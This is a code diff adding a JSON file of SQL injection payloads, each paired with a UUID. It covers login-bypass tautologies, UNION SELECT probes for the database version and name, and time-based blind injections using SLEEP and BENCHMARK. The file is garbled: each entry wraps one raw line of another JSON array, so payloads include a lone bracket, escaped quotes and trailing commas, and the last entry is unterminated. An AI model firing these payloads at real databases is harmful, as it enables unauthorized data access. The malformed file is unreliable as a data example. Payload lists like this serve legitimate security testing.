@@ -1,0 +1,94 @@
+[
+    {
+        "id": "5139db27-dda0-4216-8962-c1012bf2eed9",
+        "payload": "["
+    },
+    {
+        "id": "b8701787-229e-4f90-900a-a9d1da3a313c",
+        "payload": "  \"' OR '1'='1\","
+    },
+    {
+        "id": "56220137-d610-4ace-abd2-b3d12fee6bd9",
+        "payload": "  \"' OR '1'='1' -- \","
+    },
+    {
+        "id": "6fa6fda4-1959-46eb-9d23-2a36d161ea98",
+        "payload": "  \"' OR '1'='1' #\","
+    },
+    {
+        "id": "4fa338aa-8a5e-46c6-90ff-71ebac449894",
+        "payload": "  \"' OR 1=1 -- \","
+    },
+    {
+        "id": "dcf6979c-169f-40f0-81f1-3286bafcef58",
+        "payload": "  \"' OR 1=1 #\","
+    },
+    {
+        "id": "e26053c0-76e7-49d4-a1dc-aecd316b1e1f",
+        "payload": "  \"' OR 1=1 -- -\","
+    },
+    {
+        "id": "d69eb6ab-0f3d-4bbd-8c26-64c7bc1a3de2",
+        "payload": "  \"' OR 1=1 # \","
+    },
+    {
+        "id": "62842156-fc25-41c3-bef4-0b31333ec075",
+        "payload": "  \"' OR 1=1 -- a\","
+    },
+    {
+        "id": "edec28da-f70e-4612-b79f-081d471143b2",
+        "payload": "  \"' OR 1=1 # a\","
+    },
+    {
+        "id": "cfb00a50-fefa-4a4d-8d52-46912029b0ce",
+        "payload": "  \"' OR 'a'='a\","
+    },
+    {
+        "id": "aa4d56e7-c329-4743-b7b1-e2652f5413fd",
+        "payload": "  \"' OR 'a'='a' -- \","
+    },
+    {
+        "id": "2c79fb31-d138-464c-802e-1e1af834e6f2",
+        "payload": "  \"' OR 'a'='a' #\","
+    },
+    {
+        "id": "8c4d9cdd-5be2-46a9-a351-19d2098f2bdd",
+        "payload": "  \"' UNION SELECT 1,2 -- \","
+    },
+    {
+        "id": "bf592dd0-a5c3-43fe-b35c-632ac201c446",
+        "payload": "  \"' UNION SELECT 1,2 #\","
+    },
+    {
+        "id": "8c202a0f-a538-4c0c-a820-d2f85f65a8d1",
+        "payload": "  \"' UNION SELECT @@version, database() -- \","
+    },
+    {
+        "id": "406cd532-4108-4e06-a7fc-ca139a648aff",
+        "payload": "  \"' UNION SELECT @@version, database() #\","
+    },
+    {
+        "id": "01e3bf29-4506-4f88-aa31-cb3e42977878",
+        "payload": "  \"' UNION SELECT null, null -- \","
+    },
+    {
+        "id": "081ca8f9-0af8-46b0-8bcd-df9f71ea42dc",
+        "payload": "  \"' UNION SELECT null, null #\","
+    },
+    {
+        "id": "e85f321f-5248-4f5f-a381-311350c843fa",
+        "payload": "  \"' OR SLEEP(5) -- \","
+    },
+    {
+        "id": "923db6c4-efd8-4da1-b138-337199e2e02f",
+        "payload": "  \"' OR SLEEP(5) #\","
+    },
+    {
+        "id": "63a6beb5-404b-4981-9d1a-c27c766b522e",
+        "payload": "  \"' OR BENCHMARK(1000000, MD5('test')) -- \","
+    },
+    {
+        "id": "2c582827-3bec-4e3b-a029-8024b50e6e07",
+        "payload": "  \"' OR BENCHMARK(1000000, MD5('test')) #"
+    }
+]
